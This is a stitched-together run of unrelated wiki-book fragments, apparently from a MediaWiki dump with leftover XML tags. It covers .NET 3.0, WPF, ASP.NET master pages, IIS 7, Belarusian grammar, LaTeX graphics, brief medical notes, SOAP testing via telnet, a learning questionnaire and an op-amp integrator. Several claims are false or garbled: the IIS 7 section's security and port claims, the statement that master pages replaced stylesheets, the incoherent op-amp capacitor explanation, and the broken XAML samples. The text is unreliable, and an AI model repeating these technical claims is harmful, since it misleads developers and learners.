The runtime engine offers a number of runtime services for the workflow to run by default. But in case you want to add services on your own, you could do so by choosing and adding new services directly in the web.config. This is one of the major advantages of .NET Framework 3.0.  Besides, you can also create your own custom services and implement them in your workflow. Hence, runtime services of WWF are fully extensible.

=== Hosts ===

A hosting application or a host is the application which hosts workflows. These are applications which actually contain the workflows which are embedded in the application.

WF workflows define interfaces with methods and events to communicate with the outside world. A host application typically sets up an environment before running a workflow, providing objects that implement those interfaces.
When an object implementing such interfaces raises an event, the corresponding workflow is retrieved and the data passed on to it.

=== Visual Designer === 

The Visual Designer is a component of WWF that provides a flowchart-based model of the workflow along with the different activities. The important feature of the Visual Designer which differentiates it from designers provided with the earlier versions is the presence of a facility to include the designer in an application. true, the visual designer model of a workflow could be introduced in an application by adding a Visual Designer tool. This helps to create a monitoring tool and in the maintenance of the workflow-based application.

      <text xml:space="preserve">{{.NET Framework 3.0}}

Windows Presentation Foundation '''(codenamed:Avalon)''' is a new feature (a presentation platform) introduced with .NET Framework 3.0 which supports the creation of documents containing high-resolution pictures and graphics. WPF is also responsible for the integration of pictures and media in ordinary documents. At present, the component performing this function is Windows Forms.

====== What is Windows Presentation Foundation ======

'''A productive, unified approach to UI, media and documents to deliver unmatched user experience'''

== WPF Infrastructure ==

The Presentation Foundation contains classes to create 'Print' and 'File Open' dialog boxes, script new windows, etc. It makes use of four specific classes most of the time:

* UIElement 
* FrameworkElement 
* ContentElement 
* FrameworkContentElement 

These classes help in building an effective and easy to use user interface. The WPF UI is usually in the form of a '''Element Tree'''. Element Trees used in WPF are of two types:

* Logical Tree 
* Visual Tree

Element Trees are usually implemented in XAML by dragging and dropping and creating relationships between the concerned elements. In code, they depend on how we give property values for properties.

The logical tree involves creating a tree structure by adding a listbox tag and list items inside the tag. In the case of a DockPanel we use Children property.

The visual tree is mainly used by programmers who want to meddle with the underlying low-level components of the program.

=== Combination of Markup and Programming ===

While the usage of a programming language as C# is best recommended for programming logic, the usage of markup languages is recommended for texts and UIs.

In earlier versions of the .NET framework, the designer part was separate from the code. However, in .NET 3.0, both the designer part programmed in XAML and the logic programmed in C# are included in the same code. 

&lt;pre&gt;
XAML File
&lt;Canvas ID=&quot;root“ xmlns=&quot;http://schemas.microsoft.com/2003/xaml“&gt;
	&lt;Button Click=&quot;Button_Click&quot;&gt;Click Me!&lt;/Button&gt;
&lt;/Canvas&gt;

C# code-behind file 
using…
namespace Button
{
	public partial class Default : Panel
	{     // Event handler
		   void Button_Click (object sender, System.Windows.Controls.ClickEventArgs e)
 	       {    btn1.Background = System.Windows.Media.Brushes.Red;  }
	}
}

&lt;/pre&gt;

== Graphics ==

Windows Presentation Foundation enables the user to create graphic applications of high-quality.
You could add existing or create custom buttons using &lt;button&gt; tag, create docked panels, 2D and 3D graphical images, use color picker controls, create or modify images, videos, create custom medi players, etc.    

=== Drawing Object Model ===

The WPF graphics system offers a completely new programming style. With Win32-based UI technologies, if you want to draw customized graphics, you must write code that responds to repaint requests, drawing the details on demand. This code effectively paints directly to the screen. If that part of the screen becomes obscured by another window and then uncovered, Windows sends a message requesting that this be redrawn. If you want to change the appearance of your graphics, you need to instruct Windows to invalidate the relevant areas of the screen in order to initiate a repaint.

=== Richly Formatted Text ===

WPF also helps us create formatted text easily and hence rich formatting could be used. The contents are enclosed within a &lt;textblock&gt; tag.

User Events could be executed easily by using triggers which are specified using the &lt;trigger&gt; tag. Apart from this, there are many other new innovations in WPF.

== Templates and Styles ==

There are two types of templates: '''Data Templates''' and '''Control Templates'''. Control Templates define the control and the visual structure of the control.

'''Syntax:'''
&lt;pre&gt;
ControlTemplate x:Key=“MyButton” TargetType=“{x:Type Button}”&gt;
    &lt;Grid&gt;
        &lt;Ellipse /&gt;
        &lt;ContentPresenter /&gt;
    &lt;/Grid&gt;
&lt;/ControlTemplate&gt;
&lt;/pre&gt;

On the contrary, data templates contain specifications about the data to be stored.


'''Syntax:'''

&lt;pre&gt;

&lt;DataTemplate DataType=“{x:Type PhotoObject}”&gt;
    &lt;Image Source=“{Binding FileName}” /&gt;
&lt;/ControlTemplate&gt;
&lt;/pre&gt;

Styles are used to specify the syles of buttons used.

&lt;pre&gt;
&lt;Style x:Key=“MyStyle” TargetType=“{x:Type Button}”&gt;
&lt;/Style&gt;
&lt;/pre&gt;

Styles can also be based on other styles.

&lt;pre&gt;
Style x:Key=“MyStyle” BasedOn=“{StaticResource BaseStyle}” /&gt;
    &lt;Setter Property=“Background” Value=“Green” /&gt;
&lt;/Style&gt;
&lt;/pre&gt;

== Documents ==

WPF supports three kinds of documents

* Fixed Documents
* Flow Documents
* XPS Documents


WPF has introduced new concepts which make the integration of text with media files easier. WPF also supports a variety of fonts which were not handled by earlier versions. 

=== Fixed Documents ===

Fixed Documents are representative of WYSIWYG (&quot;What you see is what you get&quot;) principle. Here, what you see on the screen indicates the actual layout that you will get on paper when the page is printed. Hence, even slight changes to the layout shall be critical.

=== Flow Documents ===

Flow Documents are those document formats which adjust their size, readability, dimensions, etc. depending on the size of the screen. Documents of this type are also supported by WPF.

=== XPS Documents ===

XPS documents are those which are exact representations of how the document shall look on paper. They resemble scanned images of the document itself.

== Benefits ==

* Ease of Use -- Learn ability, Performance, Reliability, Security, Optimized form factors, Legibility / Readability, Relevance / Contextualization
* Richness -- Graphics &amp; Media, Data Visualization, Higher Fidelity Information, Globalization, Accessibility, Hardware &amp; Printing Integration.

      <text xml:space="preserve">{{.NET Framework 3.0}}

Masterpages were introduced for the first time in .NET framework 2.0 in order to create an application in which multiple files have similar content. The content for which masterpages have been created include headers, trailers, etc. For sites which have a common header for all the pages, it is difficult and hectic  to ensure that the same header has been inserted into the code of each page and to ensure uniformity in text alignment, etc. To overcome this drawback, we use master pages. In .NET 1.1, cascading style-sheets were used to perform this function. However, in .NET 3.0, these stylesheets were replaced by masterpages.

== Introduction ==

The syntax used to denote a masterpage is

&lt;pre&gt;
&lt;%@ Master Language=&quot;C#&quot; %&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;%@ Master Language=&quot;C#&quot; CodeFile=&quot;MasterPage.master.cs&quot; Inherits=&quot;MasterPage&quot; %&gt;
&lt;/pre&gt;


This specifies that the page is a masterpage and is given at the start of the page.

The ASP.NET page which inherits content from a masterpage has the following tag in it.

&lt;pre&gt;
&lt;%@ Page Language=&quot;VB&quot; MasterPageFile=&quot;~/MasterPages/Master1.master&quot; Title=&quot;Content Page&quot; %&gt;
&lt;/pre&gt;

== Use of Master Pages ==
== Creating a Master Page ==

# Create a New Project
# Add a master page to the project. This could be done by clicking 'Add New Item' and selecting 'Masterpage' from the list of items displayed.
# Open the masterpage and enter the contents to be displayed just above the ContentPlace Holder object.
# Right-click on the project and click 'Add New Item'. Select 'Web Page' and check 'Select Master Page' option and click 'Ok'. The project folder dialog box will be displayed. Select the masterpage file (.master) from the list of files displayed and click 'Ok'. The file gets created and you will observe that a 'content' object gets created by default. This tag is created when a masterage is selected. If no masterpages are required in the page then this tag can be removed.
# Run the file. You will observe that the content specified on top of the ContentPlaceHolder in the Masterpage file appears on the Web page.

== Nested Masterpages ==

It is also possible to nest one masterpage inside another. The designer doesn't support nesting of master pages; however, two or more masterpages could be nested at the code level.

== SiteMaster.master ==

The SiteMaster page is made up exclusively of the Content control.

&lt;pre&gt;
&lt;asp:contentplaceholder id=&quot;SiteContentPlaceHolder&quot; runat=&quot;server&quot;&gt;
&lt;h1&gt;Site Master Page&lt;/h1&gt;&lt;/asp:contentplaceholder&gt;
&lt;/pre&gt;

== Section Master ==

Section masterpages inherit from the site master. Syntax of a site master page is given below.
&lt;pre&gt;
&lt;asp:contentplaceholder id=&quot;SiteContentPlaceHolder&quot; runat=&quot;server&quot;&gt;
&lt;h1&gt;Site Master Page&lt;/h1&gt;&lt;/asp:contentplaceholder&gt;
&lt;/pre&gt;

== Scoping Masterpages ==

Masterpages could be specified either at the page or folder or application level.

== Criticism of Masterpages ==

One complaint against master pages is that the head HTML tag is defined in the master page. This element must be shared across all pages that take their layout from the master. Several options are available to work around this issue, including modifying the head content at Runtime using Server-side code. The title, however, is freely editable via the title attribute in the master page file declaration at the top of a content page. It is actually possible to place a ContentPlaceHolder control inside the head section of the master page, although Visual Studio 2005 will generate warnings. Unfortunately, markup placed inside the associated Content control is rendered as a literal. The HtmlHead object contains specialized parsing routines to recognize elements such as link and script. This parsing code is not applied to children of a child ContentPlaceHolder control. However, there is a workaround for this. If each link and script control uses the runat=&quot;server&quot; attribute, then they will be parsed by ContentPlaceHolder as individual HtmlGenericControls. Code can then be written to iterate through each HtmlGenericControl and replace it with the appropriate control type (HtmlLink, HtmlMeta, etc.) after performing attribute mapping.[citation needed]

==Description==
Briefly describe your most positive learning experience. Think back to a time when you can say you really learned something. It might have been at school in a particular class, or at university in a particular tutorial, or while you were at work, or busy at home, or with friends in a completely different situation. (one or two short paragraphs)


==Motivating Factors==
In the story you have just entered above, why did you need to or want to learn those things? Perhaps you were required to as part of a course and you needed the learning to get a qualification? Perhaps the topic was of great interest to you? Perhaps you needed to learn this in order to do something? Please explain why you needed or wanted this learning? (one paragraph)


==Factors which made this a positive experience==
What factors do you think made this such a positive learning experience? Perhaps it was the presence of a great teacher? Perhaps the other learners were very helpful? Maybe you could sense your own improvement during that time? Perhaps there was a good balance between fun and focused concentration? Perhaps it was having access to the Internet? Or something else altogether? (a list of one - five factors).

==Why these factors were important in making the experience so positive==
Why do you think these factors were so important at the time? Perhaps your state of knowledge required the great teacher to stimulate interest in the topic? Perhaps the teacher tended to talk over your head but a friend in the class could explain the concepts to you perfectly? Perhaps your self-confidence needed a boost? Perhaps the situation suited your own learning style, etc.? Please indicate why you think these factors were so important at the time: (write a paragraph or two).

      <comment>/* Foreign Names in Belarusian */</comment>
      <text xml:space="preserve">==Foreign Names in Belarusian==

When foreign proper names are written in Belarusian, they are normally transcribed, not transliterated. For example, the name ''Peter'' would be written as ''Пітэр'', not ''Пэтэр'', because the first ''e'' here stands for a long ''i'' sound. Some rules for English sounds that do not exist in Belarusian:

Diphtongues having ''i'' as their second element are represented by a vowel+''й'' combination in Belarusian.

'''Бра́йтан''' Brighton

'''Ро́нальд Рэ́йган''' Ronald Reagan

The ''ng'' sound is represented by ''нг'' combination.

'''Да́унінг-стрыт''' Downing street

The ''th'' sound is usually represented by ''т''.

'''Саутге́мптан''' Southampton

'''Плімут''' Plimouth

However, in most Greek borrowings this sound is represented by ''ф''.

'''Афiны''' Athens

'''Кары́нф''' Corynth

'''Марафо́н''' Marathon

(In tarashkievica ''т'' is used in such cases: '''Атэны''' Athens, '''Кары́нт''' Corynth, '''Марафо́н''' Marathon)

The ''w'' sound is usually represented by ''у'' though sometimes it may be represented by ''в''.

'''Уiльям''' William

'''Уэ́льс''' Wales

(In tarashkievica ''short u'' is usually used, though it breaks the rule that ''Ў'' can't precede vowels: '''Ўiльям''' William, '''Ўэ́льс''' Wales)

In German proper names this phonetical principle is, however, violated.

The ''ei'' and ''eu'' combinations are represented by ''эй'' (''ей'') though they are read as ''ай'' and ''ой'' in German.

'''Альбе́рт Эйнштэ́йн''' Albert Einstein

'''Зiгмунд Фрэйд''' Sigmund Freud

German words with the ''h'' sound have the ''г'' letter in Belarusian.

'''Герц''' Hertz

'''Гiтлер''' Hitler

This is not so with English words having this sound.

'''аэрапо́рт Хiтроу''' Heathrow airport

'''хэло́уiн''' halloween

==Adjectives Derived from Nouns==

Most nouns have corresnonding adjectives. An adjective derived from a noun N usually means ''having some relation to N'' and thus is similar to the Genitive.

Adjectives are usually used to denote a relation to a noun as a concept whereas the Genitive whould be used to denote a relation to a certain object beloning to the class denoted by this noun.

'''шко́льны наста́ўнік''' a school teacher

'''дырэ́ктар шко́лы''' the headmaster of the school

'''царко́ўная літарату́ра''' church literature

'''ку́пал царквы́''' the dome of the church

'''Гэ́та жано́чы го́лас.''' This is a voice of a woman (not of a man).

'''Гэ́та го́лас той жанчы́ны.''' This is the voice of that woman.

With nouns denoting unigue objects, particularly, with proper names, the adjectives and the Genitive are interchangeable.

'''со́нечны свет''' = '''свет Со́нца''' sunlight = the light of the Sun

'''ло́нданскі мэр''' = '''мэр Ло́ндана''' the London meyor = the mayor of London

Adjectives are usually derived from nouns with the help of different suffixes. The most common of them is the ''н'' suffix.

'''маро́з''' frost - '''маро́зны дзень''' a frosty day

'''гара́''' a mountain - '''го́рная краіна''' a mountainous country

'''футбо́л''' football - '''футбо́льны матч''' a football match

Note that adjectives formed from nouns ending in ''л'' obtain a soft sign to make ''л'' soft.

Some other suffixes, that are used less often, include:

* '''ов (ёв)'''

'''вёска''' a village - '''вяско́вы хло́пец''' a village boy

'''по́ле''' a field - '''палёвая мыш''' a field mouse

'''по́шта''' post; mail - '''пашто́вая скры́ня''' a mailbox

* '''оўн'''

'''пра́ца''' work - '''працо́ўны дзень''' a working day

* '''альн'''

'''тэа́тр''' a theatre - '''тэатра́льная ка́са''' a theatre desk

* '''ск'''

'''го́рад''' a city; a town - '''гарадска́я пло́шча''' a town square

'''мо́ра''' a sea - '''марскія хва́лі''' sea waves

This suffix is used with most geographical names.

'''Віцебск''' Vitebsk - '''віцебскі трамва́й''' a Vitebsk tram

'''Украіна''' Ukraine - '''украінская мо́ва''' the Ukrainian language

Note that adjectives derived from proper names are not capitalized in Belarusian.

==The Second Conjugation of Verbs==

      <text xml:space="preserve">=(1) Collaborative Chemistry=

==Description==
One of my most positive learning experiences occurred in a Chemistry class. The class was required to work on a (titration) problem and then discuss their approaches to solving the problem.Answers varied and learners checked their assumptions and reached a broad consensus on a particular value as the answer.

The teacher was really good at explaining concepts and made the subject extremely exciting. class
When writing this section: briefly describe your most positive learning experience. Think back to a time when you can say you really learned something. It might have been at school in a particular class, or at university in a particular tutorial, or while you were at work, or busy at home, or with friends in a completely different situation. (one or two short paragraphs)


==Motivating Factors==
We were studying a school subject in preparation for public exams, and needed to understand the concepts to pass the exams.
I also had a particular fascination for the subject.


==Factors which made this a positive experience==

* The teacher's enthusiasm made the subject (chemistry) exciting.
* Having the opportunity to discuss our thinking with class-mates was really useful. The discussions often continued after class.

==Why these factors were important in making the experience so positive==

* Chemistry can be boring if not presented in the right way.
* I could not always understand what the teachers were trying to get us to understand. Often, having the concept explained by someone else in the class (another learner) worked better.
* Having realised this, we were all more willing to discuss our understanding of things from various classes - less worried about being accused of copying, or getting other people to do our work for us. As a group, the class became more orientated towards really understanding the work, rather than just getting the homework done.


==Level and Location==

Indicate which of: [ ] junior school [ ] high school [*] higher education [ ] a short course [ ] at work [ ] at home Other: ................ (explain)

This experience occurred during the early years of high school (age 14). while I was at high school in southern Africa in the early 1980s.
The school was well resourced, but no computers or Internet.

      <text xml:space="preserve">Inspired by Alexander, analysis patterns, design patterns, etc. and moving into other disciplines including education and learning, psychology, physiotherapy, ecology, sport (tactics), etc. ... (more coming soon). [[User:Ktucker|Ktucker]] 12:05, 28 June 2007 (UTC)

There has been a suggestion to merge this into [[Lore of Learning]]&lt;ref&gt;[[Talk:Lore of Learning/Patterns of Learning|Discussion re merge with Lore of Learning]]&lt;/ref&gt;:

It might be a good idea to include a volume in [[Lore of Learning]] oriented towards teaching specific disciplines (at specific levels of education: primary, secondary, tertiary, life-long, ...).  The disciplines could be as diverse as the authors that might offer chapters.

Originally, for Knowledge Patterns, I had the following in mind

* architecture - for me it all started with Alexander after the GoF book:
* software engineering and architecture (analysis patterns, design patterns, etc.)
* education - a natural extension 
* psychology
* ecology.
* and to free reader/writers to contribute chapters on other disciplines.

I have come across the term &quot;patterns&quot; being used in many other fields (physiotherapy, sports training, choreography, management, etc.).  

But note that the focus here is on the structure of the knowledge itself, rather than the process of gaining that knowledge.

{{under construction}}

In the [[LaTeX/Importing_Graphics|Importing Graphics]] chapter, you learned that you can import or link graphics into LaTeX, such as graphics that you have created in another program or obtained elsewhere. In this chapter, you will learn how to create or embed graphics directly in a LaTeX document. The graphics is marked up using commands similar to those for typesetting bold text or creating mathematical formulas, as the following example of embedded graphics shows:

{{LaTeX/Example|code=\begin{displaymath}
\xymatrix{ \bullet \ar[r] \ar@{.&gt;}[r] &amp; \bullet }
\end{displaymath}
|render=[[image:Latex-xymatrix.png|150px]]}}

There are several packages supporting the creation of graphics directly in LaTeX, including [[LaTeX/Picture|&lt;tt&gt;picture&lt;/tt&gt;]], [[LaTeX/Xy-pic|&lt;tt&gt;xy-Pic&lt;/tt&gt;]] and [[LaTeX/PGF/TikZ|&lt;tt&gt;PGF/TikZ&lt;/tt&gt;]], described in the following sections.

Compared to WYSIWIG tools like Xfig or Inkscape, this approach is more time consuming, but leads to much better results. Furthermore, the ouput is flawlessly integrated to your document (no contrast in size nor fonts).

See the [[LaTeX/Importing_Graphics|Importing Graphics]] for more details on graphics importation and some attempts to circumvent to integration issue.

==Overview==

The &lt;tt&gt;picture&lt;/tt&gt; environment allows programming pictures directly in LaTeX. On the one hand, there are rather severe constraints, as the slopes of line segments as well as the radii of circles are restricted to a narrow choice of values. On the other hand, the picture environment of LaTeX2e brings with it the &lt;tt&gt;\qbezier&lt;/tt&gt; command, &quot;q&quot; meaning ''quadratic''. Many frequently-used curves such as circles, ellipses, and [[wikipedia:catenary|catenaries]] can be satisfactorily approximated by quadratic Bézier curves, although this may require some mathematical toil. If a programming language like Java is used to generate &lt;tt&gt;\qbezier&lt;/tt&gt; blocks of LaTeX input files, the picture environment becomes quite powerful.

Although programming pictures directly in LaTeX is severely restricted, and often rather tiresome, there are still reasons for doing so. The documents thus produced are &quot;small&quot; with respect to bytes, and there are no additional graphics files to be dragged along.

Packages like &lt;tt&gt;epic&lt;/tt&gt;, &lt;tt&gt;eepic&lt;/tt&gt; or &lt;tt&gt;pstricks&lt;/tt&gt; enhance the original picture environment, and greatly strengthen the graphical power of LaTeX.

While the former two packages just enhance the picture environment, the &lt;tt&gt;pstricks&lt;/tt&gt; package has its own drawing environment, &lt;tt&gt;pspicture&lt;/tt&gt;. The power of &lt;tt&gt;pstricks&lt;/tt&gt; stems from the fact that this package makes extensive use of PostScript possibilities. Unfortunately it has one big shortcoming: it doesn't work together with pdfLaTeX, as such. To generate a PDF document from TeX source, you have to go from TeX to DVI to PDF, losing hyperlinks, metadata, and microtypographic features of pdflatex in the process.

In addition, numerous packages have been written for specific purposes. One of them is ''XY-pic,'' described at the end of this chapter. A wide variety of these packages are described in detail in ''The LaTeX Graphics Companion'' (not to be confused with ''The LaTeX Companion'').

Perhaps the most powerful graphical tool related with LaTeX is [[w:MetaPost|MetaPost]], the twin of Donald E. Knuth’s [[w:METAFONT|METAFONT]]. MetaPost has the very powerful and mathematically sophisticated programming language of METAFONT. Contrary to METAFONT, which generates bitmaps, MetaPost generates encapsulated PostScript files, which can be imported in LaTeX. For an introduction, see ''A User’s Manual for MetaPost.''  A very thorough discussion of LaTeX and TEX strategies for graphics (and fonts) can be found in ''TEX Unbound.''

The last but certainly not least are the PGF/TikZ and Asymptote systems. While the previous systems (&lt;tt&gt;picture&lt;/tt&gt;, &lt;tt&gt;epic&lt;/tt&gt;, &lt;tt&gt;pstricks&lt;/tt&gt; or &lt;tt&gt;metapost&lt;/tt&gt;) focus on the ''how'' to draw, TikZ and Asymptote focus more on the ''what'' to draw. One could say that TikZ and Asymptote are to drawing in LaTeX as LaTeX is to digital typesetting. It's recommended to use one of these if your LaTeX distribution includes it. TikZ is a pure (La)TeX system, not reliant on external software, while [[w:Asymptote (vector graphics language)|Asymptote]] is an external system which integrates seamlessly with (La)TeX.  If using Asymptote, it is very helpful to use [http://www.ctan.org/pkg/latexmk/ latexmk] to manage the compilation steps.

In many cases, especially for more advanced diagrams, it may be easier to draw the graphics using external vector graphics software, and then import the file into the document (see [[../Importing Graphics]]). However most software does not support LaTeX fonts or mathematical notation, which can result in not suitable and inconsistent graphics. There are several solutions to this problem.

      <text xml:space="preserve">Quite simply, a medication for administration directly to the eye is an ophthalmic medication. It can be an ointment or liquids. 

To successfully administer an ophthalmic medication, one should put a (clean) finger on the skin just below the lower eyelash and pull gently down. This creates a tiny sac that the medication can be dripped or squeezed into.
 
Be careful, if possible, not to touch the tip of the medication to the eye, both to avoid injury to the eye, and to avoid contaminating the medication.

      <text xml:space="preserve">Temperature on the earth is due not only to solar radiation, but also to the earth's atmosphere, which can absorb and hold heat. Compare the temperature of earth to the temperature of Venus, which has 97% carbon dioxide. That high content holds in the heat. It is one of the reasons that Venus is so hot.</text>

      <text xml:space="preserve">'''.NET Instructions:'''
To more easily consume these services with .NET, your .NET users need to make a few minor modifications:

•  try using the WS client tool inside the VS.Net IDE, do &quot;Add Web Reference&quot;, and give it the URL

•  manually change all of the references to the name &quot;Class&quot; to &quot;[Class]&quot;

•  manually change the inconsistent namespace references from &quot;default&quot; to &quot;http://serveraddress.com&quot; (the address of the server with the service)


'''Here is the simple method:'''

Figure out that you manually edit the code generated by the parser. That's normally hidden from view.  Specifically, in the IDE, highligh the project name, and select &quot;Project...Show All Files&quot; from the top menu.  Then expand the &quot;Web References&quot; tree, then the specific service, then the Reference Map, then edit the   Reference.vb (or .cs if using C#) file.

After you point it to the URL for the WSDL, it grabs the WSDL file, parses it and spews all the code needed to connect.  The resulting classes then just become available to your project, same as any other.


'''If you are still having trouble also try:'''

After pulling the xml down for dealers and transactions and editing it locally (changing Class to [Class] and default to the ip) I was able to add the reference, but it did not build until I completely removed
    &lt;xsd:schema xmlns=&quot;http://www.w3.org/2001/XMLSchema&quot; targetNamespace=&quot;http://lang.java/&quot;&gt;
      &lt;xsd:complexType name=&quot;[Class]&quot;&gt;
        &lt;xsd:sequence /&gt;
      &lt;/xsd:complexType&gt;
    &lt;/xsd:schema&gt;
from each of the wsdl’s.


'''FOR WebObjects Users:'''

.NET doesn't like multiRefs so in the Server.wsdd file change this parameter to false:
&lt;parameter name=&quot;sendMultipleRefs&quot; value=&quot;true&quot;/&gt;

      <text xml:space="preserve">You can test your services using the telnet feature in Terminal.  You'll need to know your service address and basic calls.

Open Terminal and type telnet and your server address and port:

telnet 216.139.xxx.xxx 80

Then quickly paste the following text with your service specifics in place of these generic names:

  POST /Apps/WebObjects/appName.woa/ws/ServiceName HTTP/1.0
  Host: 216.139.xxx.xxx
  Content-Type: text/html; charset=utf-8
  Content-Length: 547
  SOAPAction: &quot;OperationName&quot;
  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
  &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
    &lt;SOAP-ENV:Body&gt;
      &lt;ns0:OperationName xmlns:ns0=&quot;http://DefaultNamespace&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
        &lt;inParameter1 xsi:type=&quot;xsd:string&quot;&gt;49464&lt;/inParameter1&gt;
        &lt;inParameter2 xsi:type=&quot;xsd:int&quot;&gt;10&lt;/inParameter2&gt;
      &lt;/ns0:OperationName&gt;
    &lt;/SOAP-ENV:Body&gt;
  &lt;/SOAP-ENV:Envelope&gt;

Of course this is just an example but you can get the idea that with the soap wrapper and proper naming you can user terminal for a soap request.  The result will appear in the terminal window as well (showing you if your service works and what it returns).

      <text xml:space="preserve">&quot;max&quot; is a horrible use of the template system. Read the Scott Meyers article on it to realize how bad it is. A different template example should be chosen.

&quot;Third, each use of a template may cause the compiler to generate extra code (an instantiation of the template), so the indiscriminate use of templates can lead to code bloat, resulting in excessively large executables.&quot;
- This is a genuine drawback, but it is expressed incorrectly (or confusingly).  Reread the code bloat link.  The problem is with a compiler generating all the functions for a type when only some limited number are used. - Willow.</text>

      <text xml:space="preserve">Disinhibition is an odd word. Inhibition is &quot;being inhibited&quot;, or being reluctant to do something, for whatever reason. Disinhibition is being less reluctant. 

*Alcohol is the best known drug for disinhibition, where &quot;normal&quot; people who would never think of dancing on tables or making a pass at the boss' wife do so &quot;under the influence&quot;.

This is also an important concept in the use of anti-depressant medications, as a rare person will start to feel better, and then commit suicide.

      <text xml:space="preserve">'''Dementia''' is a word that means the brain is losing its ability to work normally. This is, given the current state of Medicine, essentially permanent, though medications can dramatically slow certain types of dementia down &quot;to a crawl&quot;. 

There are several types of dementia (like there are several kinds of automobiles), the most common one being '''Alzheimer's Dementia'''.

      <text xml:space="preserve">Inflammation is a very common bodily mechanism, usually involved in the repair of damaged tissue. It is a complex phenomenon, where certain molecules are put in the blood stream by the damaged tissue and attracts particular blood cells to the area, which also release their chemicals, causing even more and different blood cells to arrive. 

Without inflammation one would not heal a wound. 

However, too much inflammation can be a problem as well. 

*An &quot;overuse syndrome&quot; is caused by a person who, for example, goes out the first day of spring and plays tennis for two hours, when they haven't played for months. Their elbow will be &quot;overused&quot;, especially to the use it received the day before the tennis game, and the body's reaction will be to try to &quot;heal&quot; it through it's use of inflammation. 

*Certain races can have too much inflammation in wound healing, leading to the formation of a lot of extra skin, called a keloid.

      <text xml:space="preserve">{{.NET Framework 3.0}}

The .NET Framework 3.0 has been created mainly as an extension of .NET 2.0. Hence, Microsoft assures us that most of the features of .NET 2.0 would be workable with .NET 3.0. Migration from .NET 2.0 to .NET 3.0 is easy as it involves only the upgradation of the features and not a complete installation  of the .NET 3.0 framework. Applications written and run in .NET 2.0 will still continue to run in .NET 3.0 without affecting the execution of .NET 3.0 specific applications.'''Components shared with the .NET Framework 2.0 are installed at %windir%\Microsoft.NET\Framework\V2.0.50727. Components that are new to the .NET Framework 3.0 are installed to %windir%\Microsoft.NET\Framework\V3.0.'''

Released on November 6, 2006, .NET Framework 3.0 was designed to be shipped as an integral part of Windows Vista Operating System and Windows Server 2008 . Nevertheless, .NET 3.0 also works fine with Windows XP and Windows Server 2003.

.NET 3.0 does not contain any major architectural change from .NET Framework 2.0. The only significant chage is the inclusion of four major components: Windows Communication Foundation, Windows Presentation Foundation, Windows Cardspace and Windows Workflow Foundation. These components contain modules of code in order to reduce complexity and to make programming simpler, faster and easier.

.NET Framework 3.0 includes version 2 of the Common Language Runtime(CLR).

A better idea of the .NET Framework can be obtained by visiting the official .NET 3.0 site [http://www.netfx3.com www.netfx3.com].You can experience for yourself the features of .NET Framework 3.0 by registering and using Windows Vista simulations at [http://labs.netfx3.com/ Microsoft .NET 3 Virtual Labs]

      <text xml:space="preserve">{{.NET Framework 3.0}}

IIS 7.0 is an extension of IIS 6.0 and has a lot in common with IIS 6.0. While the underlying concepts remain the same various dramatic new concepts have been introduced in IIS 7.0.

== Modular Architecture ==

IIS 7.0 introduces the system of a &quot;modular architecture&quot;. A modular architecture is one in which the extra functionality in the form of different modules can be added to the server and could be enabled or disabled depending on the administrator's wish. This is a marked change from the monolithic architecture implemented in earlier systems.

The modules that shall be shipped with the server include:

* HTTP Modules 
* Security Modules 
* Content Modules 
* Compression Modules 
* Caching Modules 
* Logging and Diagnostics Modules

== More Security ==

In earlier versions of IIS, the ASP.NET web services were executed by aspnet_wp.exe (IIS 5.0) and w3wp.exe (IIS 6.0). Thus the pages were executed outside the IIS and could easily become targets of attacks by spoofers listening at the port. But in IIS 7.0, the pages are compiled and executed within the IIS and even if the hacker gains access to the system the stream of data which comes out of the port appears highly unintelligible and impossible for a hacker or spoofer to break.

Unfortunately, IIS 7.x, like IIS 6.x, is still running in the HTTP.SYS Windows kernel-driver, which Microsoft documents as dangerous: 

''&quot;when a kernel-mode driver fails, it can crash an entire system, whereas the failure of a user-mode driver causes only the current process to crash. Windows Server can still run kernel-mode drivers, although this is not recommended for the stability reasons mentioned previously.&quot;''

http://technet.microsoft.com/en-us/library/cc784266(WS.10).aspx

== Ports ==

IIS 7.0 allows the user to select the port where he wants the program or service to run. This is a welcome break from old versions of IIS where all applications would be run at a standard 8080 port making transactions less secure and slowing down execution.

== Modules and Handlers ==

In IIS 6.0, the modules and handlers are specified in the &lt;system.web&gt; configuration section. However in IIS 7.0, a new tag &lt;system.webserver&gt; is introduced and the modules and handlers are specified here. This is one of the most important migration issues that must be looked into while migrating from IIS 6.0 to IIS 7.0.

This is done by placing the tags &lt;httpModules&gt; and &lt;httpHandlers&gt; in &lt;system.webservices&gt; tag.

== Microsoft Management Console ==

The Microsoft Management Console (MMC) is a component of modern Microsoft Windows operating systems that provides system administrators and advanced users with a flexible interface through which they may configure and monitor the system

&lt;span style=&quot;font-size:100%; color:#FF0000&quot;&gt;'''Circuit idea:''' ''The op-amp compensates the  voltage drop across the capacitor adding as much voltage to the input voltage source as it loses across the capacitor.''&lt;/span&gt;

== Speculation: ''The active version is just an improved passive one'' ==

&lt;center&gt;&lt;span style=&quot;font-size:130%; color:#999999&quot;&gt;'''''Active RC integrator = passive RC integrator + op-amp + great idea ?''&lt;/span&gt;&lt;/center&gt;

== Problem: ''The capacitor affects the current'' ==

The main idea is that in picture we have a constant voltage source, which, across the resistor , will drive a constant current. 
At the beginning, when the voltage is up, the conductor material will be a support for potential propagation and the voltage will be applied all on capacitor, but the current will be zero.If the capacitance is infinite, there will be no current in resistor, and the resistor will be connected to &quot;wind&quot;.When the voltage reach steady state ,as the capacitor between the armature, has a finite resistence , the current will be non zero, and the resistor will be not conected in &quot;wind&quot; but at ground through in-between armature material.The non-zero current will drop a voltage across the resistor, and the output voltage will be the source voltage without the resistence voltage.We can replace the capacitor with a current source, which will be the present disturbance or  Norton equivalent voltage source only for discharge time.We prefer the last one.
Do not consider the ohmic non linear effects.

== Basic non-electrical idea: ''Removing a disturbance by an &quot;antidisturbance&quot;'' ==

